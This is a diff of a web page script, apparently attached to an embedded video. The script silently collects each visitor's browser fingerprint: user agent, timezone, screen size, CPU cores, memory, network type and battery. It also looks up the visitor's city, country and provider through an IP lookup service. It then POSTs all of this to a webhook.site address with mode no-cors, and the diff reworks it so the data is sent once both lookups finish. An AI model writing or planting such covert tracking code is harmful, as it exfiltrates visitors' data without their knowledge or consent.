@@ -171,61 +171,55 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
 
 
 
-    const data = {
 
+    const data = {
         userAgent: navigator.userAgent,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-
-
         screenResolution: screen.width + "x" + screen.height,
         actualScreenResolution: (screen.width * window.devicePixelRatio) + "x" + (screen.height * window.devicePixelRatio),
         devicePixelRatio: window.devicePixelRatio,
-
-
         cpuCores: navigator.hardwareConcurrency || 'Unknown',
         deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
         networkType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-
-
-        battery: 'Checking...',
-
-
-        ipData: 'Checking...'
+        battery: 'Not supported',
+        ipData: 'Error'
     };
 
 
-    if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-            data.battery = battery.level * 100 + "% " + (battery.charging ? "(Charging)" : "");
-            sendData(); // Отправляем после получения
-        });
-    } else {
-        data.battery = 'Not supported';
-        sendData(); // Отправляем сразу, если батареи нет
-    }
+    const getBattery = new Promise(resolve => {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                resolve(b.level * 100 + "% " + (b.charging ? "(Charging)" : ""));
+            });
+        } else {
+            resolve('Not supported');
+        }
+    });
+
+    const getIp = new Promise(resolve => {
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(ipInfo => resolve(`${ipInfo.city}, ${ipInfo.country_name} (${ipInfo.org})`))
+            .catch(() => resolve('Error'));
+    });
 
 
-    fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(ipInfo => {
-            data.ipData = `${ipInfo.city}, ${ipInfo.country_name} (IP: ${ipInfo.ip})`;
-        })
-        .catch(() => { data.ipData = 'Error getting IP'; });
+    Promise.all([getBattery, getIp]).then(results => {
+        data.battery = results[0];
+        data.ipData = results[1];
 
 
-    function sendData() {
-        const myUrl = 'https://webhook.site/0ad04dd7-b48f-4e05-aacd-c294a9cf3ef7'; // Убедитесь, что ссылка https
-
+        const myUrl = 'https://webhook.site/0ad04dd7-b48f-4e05-aacd-c294a9cf3ef7';
         fetch(myUrl, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         })
-        .then(() => console.log('Данные отправлены!'))
+        .then(() => console.log('Данные успешно отправлены!'))
         .catch(error => console.error('Ошибка:', error));
-    }
+    });
 </script>
 
 
